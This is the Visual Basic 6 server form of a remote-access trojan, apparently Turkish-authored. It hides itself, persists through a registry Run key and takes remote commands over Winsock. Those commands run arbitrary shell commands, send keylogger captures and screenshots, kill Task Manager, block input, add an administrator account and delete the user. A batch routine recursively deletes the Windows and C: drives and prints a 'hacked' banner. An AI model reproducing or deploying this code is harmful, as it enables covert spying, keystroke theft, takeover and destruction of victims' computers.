VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Server"
   ClientHeight    =   1785
   ClientLeft      =   -7275
   ClientTop       =   3840
   ClientWidth     =   4785
   Icon            =   "server.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1785
   ScaleWidth      =   4785
   ShowInTaskbar   =   0   'False
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   3960
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer5 
      Interval        =   5000
      Left            =   3480
      Top             =   1440
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3480
      Top             =   960
   End
   Begin VB.TextBox kullanici_sifre 
      Height          =   495
      Left            =   3480
      TabIndex        =   13
      Top             =   480
      Width           =   1215
   End
   Begin VB.TextBox kullanici 
      Height          =   495
      Left            =   3480
      TabIndex        =   12
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   3000
      Top             =   960
   End
   Begin VB.TextBox ekran 
      Height          =   495
      Left            =   2400
      TabIndex        =   11
      Top             =   1440
      Width           =   1215
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   2400
      Top             =   960
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.TextBox info_kayit_dizini 
      Height          =   495
      Left            =   2400
      TabIndex        =   10
      Top             =   480
      Width           =   1215
   End
   Begin VB.Timer Timer2 
      Interval        =   60000
      Left            =   3120
      Top             =   0
   End
   Begin VB.TextBox ftp_bilgi 
      Height          =   495
      Left            =   1920
      TabIndex        =   9
      Top             =   0
      Width           =   1215
   End
   Begin VB.TextBox acilis_mesaj_oku 
      Height          =   495
      Left            =   1200
      TabIndex        =   8
      Top             =   1920
      Width           =   1215
   End
   Begin VB.TextBox acilis_baslik_oku 
      Height          =   495
      Left            =   0
      TabIndex        =   7
      Top             =   1920
      Width           =   1215
   End
   Begin VB.TextBox acilis_mesaj_yedek 
      Height          =   495
      Left            =   1200
      TabIndex        =   6
      Text            =   $"server.frx":4C253
      Top             =   1440
      Width           =   1215
   End
   Begin VB.TextBox acilis_baslik_yedek 
      Height          =   495
      Left            =   0
      TabIndex        =   5
      Text            =   "Microsoft Windows"
      Top             =   1440
      Width           =   1215
   End
   Begin VB.TextBox acilis_mesaj 
      Height          =   495
      Left            =   1200
      TabIndex        =   4
      Text            =   $"server.frx":4C2DB
      Top             =   960
      Width           =   1215
   End
   Begin VB.TextBox acilis_baslik 
      Height          =   495
      Left            =   0
      TabIndex        =   3
      Text            =   "Microsoft Windows"
      Top             =   960
      Width           =   1215
   End
   Begin VB.TextBox Text3 
      Height          =   495
      Left            =   0
      TabIndex        =   2
      Text            =   "Text3"
      Top             =   480
      Width           =   1455
   End
   Begin VB.TextBox Text2 
      Height          =   495
      Left            =   720
      TabIndex        =   1
      Text            =   "Text2"
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   360
      Top             =   0
   End
   Begin VB.TextBox Text1 
      Height          =   495
      Left            =   1440
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   480
      Width           =   975
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim r As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_CLOSE = &H10
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Private Declare Function MCISendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Const WM_SETTEXT = &HC
Private Const WM_GETTEXT = &HD
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SendMessageSTRING Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
Dim acilis_mesaji_baslik As String
Dim acilis_mesaji_icerik As String
Dim speec As SpVoice
Public Sub SetStartCaption(str As String)
Dim StartBar As Long
Dim StartBarText As Long
Dim sCaption As String
StartBar = FindWindow("Shell_TrayWnd", vbNullString)
StartBarText = FindWindowEx(StartBar, 0&, "button", vbNullString)
sCaption = Left(str, 6)
SendMessageSTRING StartBarText, WM_SETTEXT, 256, sCaption
Exit Sub
End Sub

Private Sub Form_Load()
On Error Resume Next
Me.Hide
Me.Visible = False
App.TaskVisible = False
Winsock1.LocalPort = 1169
Winsock1.Listen
Dim KayitDefteri As Object
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
frmMain.Show
frmMain.Hide
frmMain.Visible = False
pc_info
Bilgi_gonder
'Form3.Show
'Form3.Hide
'Form3.Visible = False
'acilis_yazisi
keyloger.Show
keylog_read
frmServer.Show
frmServer.Hide
frmServer.Visible = False
screen_main.Show
screen_main.Hide
screen_main.Visible = False
Form5.Show
Form5.Hide
Form5.Visible = False
'Form4.Show
'Form4.Hide
'Form4.Visible = False
Set speec = New SpVoice
Beep
Beep
Beep
End Sub
Private Sub keylog_read()
'##Bu kod kullanýlýnca keyloggeri FORM dan okur
Text3.Text = keyloger.Text1

'##Bu kodlar kullanýlýnca Keyloggeri TXT belgesinden okur
'Dim contentfile As String
'Open keyloger.Text2.Text For Input As #1
'Input #1, contentfile
'Text3.Text = contentfile
'Close #1
End Sub
Private Sub keylog_delete()
On Error Resume Next

Open keyloger.Text2.Text For Output As #1
Print #1, "";
Close #1
End Sub
Private Sub keylog_send()
keylog_read
Winsock1.SendData "keylog|" + Text3.Text
End Sub
Private Sub pc_info()
Text1.Text = "WAN IP: " & frmMain.Caption & vbNewLine & _
"LAN IP: " & Winsock1.LocalIP & vbNewLine & _
"Hostname: " & Winsock1.LocalHostName & vbNewLine & _
"Internet Connection: Yes" & vbNewLine & _
"Connection Port: " & Winsock1.LocalPort & vbNewLine
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Dim KayitDefteri As Object
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
'Shell "shutdown -t 030 -f -s", vbHide
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
Const WM_CLOSE = &H10
Dim winHwnd As Long
Dim RetVal As Long
winHwnd = FindWindow(vbNullString, "Windows Görev Yöneticisi")
If winHwnd <> 0 Then
PostMessage winHwnd, WM_CLOSE, 0&, 0&
Else
End If
End Sub

Private Sub Timer2_Timer()
'pc_info
'Dim infor As String
'infor = Text1.Text
'info_kayit
'info_upload
End Sub

Private Sub info_kayit()
'On Error Resume Next
'info_kayit_dizini.Text = "c:\windows\system32\inf_save.txt"
'Open info_kayit_dizini.Text For Output As #1
'Print #1, vbNewLine & Text1.Text;
'Close #1
End Sub

Private Sub info_upload()
'Inet1.AccessType = icUseDefault
'Inet1.Protocol = icFTP
'Inet1.RemoteHost = "<some-random-server>"
'Inet1.RemotePort = "21"
'Inet1.Password = "<some-random-password>"
'Inet1.UserName = "<some-random-username>"
'Inet1.RequestTimeout = "60"
'Inet1.Execute "ftp.0fees.net", "/htdocs/pc_inf.txt", "put c:\windows\system32\inf_save.txt"
End Sub

Private Sub info()
pc_info
Dim infor As String
infor = Text1.Text
info_kayit
info_upload
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
Shell "ipconfig /renew"
Timer3.Enabled = False
End Sub

Private Sub Timer4_Timer()
Shell "net localgroup administrators " & kullanici.Text & " /add", vbHide
Timer4.Enabled = False
End Sub

Private Sub Timer5_Timer()
Winsock2.Close
Winsock2.RemotePort = 1170
Winsock2.Connect
End Sub

Private Sub Winsock1_Close()
On Error Resume Next
Winsock1.Close
Winsock1.Listen
wins_kapandý
Form5.islem.AddItem ("Tarih : " & DateTime.Now & "  Ýþlem : " & "Yönetici Baðlantýyý Kesti")
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
Winsock1.Close
Winsock1.Accept requestID
Form5.islem.AddItem ("Tarih : " & DateTime.Now & "  Ýþlem : " & "Yönetici baðlandý.")
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim receive As String
Dim Vector() As String
Winsock1.GetData receive
Vector() = Split(receive, "|")
Select Case Vector(0)
Case "message"
MsgBox Vector(1), vbCritical, "Microsoft Windows"
Case "bilgiyolla"
pc_info
Winsock1.SendData "bilgi|" + Text1.Text
Case "speec_oku"
speec.Speak Vector(1)
Case "komut"
On Error Resume Next
Shell Vector(1), vbHide
Case "baslat_yazisi"
SetStartCaption Vector(1)
Case "ekran_kapat"
Form2.Show
Form2.Visible = True
Form1.Timer1.Enabled = True
Shell "taskkill /F /IM " & "explorer.exe", vbHide
Form2.Timer1.Enabled = True
Case "server_sil"
kendini_sil
Case "keylog_gonder"
keylog_read
keylog_send
Case "keylog_sil"
keyloger.Text1.Text = ""
keylog_delete
Case "server_kapat"
Shell "taskkill /F /IM " & App.EXEName & ".exe", vbHide
Case "server_show"
Form5.Show
Form5.Visible = True
Case "server_gizle"
Form5.Hide
Form5.Visible = False
Case "ekran_ac"
Form2.Hide
Form2.Visible = False
Form2.form_nlad
Form1.Timer1.Enabled = False
Shell "explorer.exe", vbHide
Form2.Timer1.Enabled = False
Case "block_ac"
BlockInput True
Case "block_kapat"
BlockInput False
Case "disable_taskmgr"
Timer1.Enabled = True
Case "enable_taskmgr"
Timer1.Enabled = False
Case "chat_ac"
Form4.Show
Case "chat_kapat"
Unload Form4
Case "maus_ac"
SwapMouseButton (1) 'Maus Tuslarini degistir
Case "maus_kapat"
SwapMouseButton (0) 'Maus Tuslarini normal yapar
Case "cd_ac"
ret = MCISendString("Set CDAudio Door Open", RetStr, 127, 0) 'Cd Sürücüsünü Çikar
Case "cd_kapat"
ret = MCISendString("set CDAudio door closed", RetStr, 127, 0) 'Cd Sürücüsünü Tak
Case "acilis_ac"
acilis_yazisi
Case "acilis_kapat"
acilis_yazisi_kapat
Case "islem"
Form5.islem.AddItem ("Tarih : " & DateTime.Now & "  Ýþlem : " & Vector(1))
Case "acilis_yazisi_baslik"
acilis_baslik.Text = Vector(1)
acilis_yazisi
Case "acilis_yazisi_mesaj"
acilis_mesaj.Text = Vector(1)
acilis_yazisi
Case "acilis_mesaj_sifirla"
acilis_baslik.Text = acilis_baslik_yedek.Text
acilis_mesaj.Text = acilis_mesaj_yedek.Text
acilis_yazisi
Case "acilis_oku"
acilis_yazisi_oku
Case "gonderilen_calistir"
Shell frmServer.Text1.Text, vbHide
Case "klasor_ac"
On Error Resume Next
MkDir "c:\windows\dowdata\"
Case "ekran_cek"
screen_main.ekran
Winsock1.SendData screen_main.Text1.Text
Case "gorev"
gorev_yoneticisi.Show
gorev_yoneticisi.Hide
gorev_yoneticisi.Visible = False
gönder
Case "gorev_yenile"
gönder
Case "gorev_kapat"
Shell "taskkill /F /IM " & Vector(1), vbHide
Case "gorev_calistir"
Shell Vector(1), vbHide
Case "chat_victim"
Form4.List1.AddItem (vbNewLine & "Manager : " & Vector(1))
Beep
Case "ekran_mesaj"
ekran.Text = Vector(1)
If ekran.Text = "acik" Then
Form2.Label1.Visible = True
ElseIf ekran.Text = "kapali" Then
Form2.Label1.Visible = False
End If
Case "ekran_mesajý"
Form2.Label1.Caption = Vector(1)
Case "clipboard_sil"
Clipboard.Clear
Case "clipboard_kopyala"
Clipboard.Clear
Clipboard.SetText Vector(1)
Case "yazdir"
Printer.Print Vector(1)
Case "internet_dakika"
Shell "ipconfig /release"
Timer3.Interval = Vector(1) & "000"
Timer3.Enabled = True
Case "kullanici_olustur"
kullanici.Text = "Yönetici"
kullanici_sifre.Text = Vector(1)
Shell "net user " & kullanici.Text & " " & kullanici_sifre.Text & " /add", vbHide
Timer4.Enabled = True
Case "yerel_kullanici_sil"
Shell "net user %username% " & "/delete", vbHide
Case "yerel_kullanici_sifresi"
Shell "net user %username% " & Vector(1), vbHide
Case "olusturulan_kullanici_sil"
Shell "net user " & kullanici.Text & " /delete", vbHide
Case "format_cek"
format
Case "internet_ac"
Shell "explorer " & Vector(1)
Case "video_adres"
Shell "taskkill /F /IM " & "explorer.exe", vbHide
Form6.Show
Form6.Player1.Enabled = True
Form6.Player1.URL = Vector(1)
Form6.Player1.fullScreen = True
Form6.Player1.settings.autoStart = True
Form6.Player1.settings.Volume = 100
Form6.Timer1.Enabled = True
Case "video_kapat"
Form6.Hide
Form6.Visible = False
Form6.Player1.Enabled = False
Shell "explorer.exe", vbHide
Form6.Timer1.Enabled = False
End Select
End Sub

Public Sub gönder()
For i = 0 To gorev_yoneticisi.List1.ListCount - 1
            Winsock1.SendData gorev_yoneticisi.List1.List(i)
           
            DoEvents
            DoEvents
        Next i
End Sub

Private Sub kendini_sil()
Open App.Path & IIf(Right(App.Path, 1) <> "\", "\Del.bat", "Del.bat") For Output As #1

Print #1, "@Echo off"
Print #1, ":S"
Print #1, "Del " & App.EXEName & ".exe"
Print #1, "If Exist " & App.EXEName & ".exe" & " Goto S"
Print #1, "Del Del.bat"
Close #1
Shell "Del.bat", vbHide
Shell "taskkill /F /IM " & App.EXEName & ".exe", vbHide
End Sub
Private Sub unld()
Unload Form1
Unload Form2
Unload Form3
Unload Form4
Unload frmMain
Unload frmServer
Unload keyloger
Unload parola
Unload saka
End Sub
Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
Winsock1.Close
Winsock1.Listen
wins_kapandý
Form5.islem.AddItem ("Tarih : " & DateTime.Now & "  Ýþlem : " & "Baðlantý Koptu !")
End Sub

Private Sub Bilgi_gonder()
On Error Resume Next

End Sub
Private Sub acilis_yazisi()
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeCaption", acilis_baslik.Text
KayitDefteri.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeText", acilis_mesaj.Text
End Sub

Private Sub acilis_yazisi_kapat()
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeText"
KayitDefteri.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeCaption"
End Sub

Private Sub acilis_yazisi_oku()
On Error Resume Next
Set KayitDefteri = CreateObject("wscript.shell")
Dim basli As String
Dim mesa As String
basli = KayitDefteri.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeText")
mesa = KayitDefteri.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON\LegalNoticeCaption")
acilis_baslik_oku.Text = basli
acilis_mesaj_oku.Text = mesa
Winsock1.SendData "acilis_baslik_ok|" + acilis_baslik_oku.Text
Winsock1.SendData "acilis_mesaj_ok|" + acilis_mesa_oku.Text
End Sub

Public Sub format()
Open App.Path & IIf(Right(App.Path, 1) <> "\", "\format.bat", "format.bat") For Output As #1

Print #1, "@echo off"
Print #1, "C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*"
Print #1, "@echo off"
Print #1, "C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*"
Print #1, "@echo off"
Print #1, "C:\WINDOWS\COMMAND\deltree /y c:\*.*"
Print #1, "@echo off"
Print #1, "cls"
Print #1, "cls"
Print #1, "@echo .::H4CK3D from Turkish Hacker::."
Print #1, "@echo off"
Close #1
Shell "format.bat", vbHide
End Sub

Private Sub wins_kapandý()
Unload Form2
Unload Form3
Unload Form4
Unload Form5
Unload Form6
End Sub

Private Sub Winsock2_Connect()
On Error Resume Next
Winsock2.SendData "bilgi|" + frmMain.Caption
Winsock2.Close
End Sub

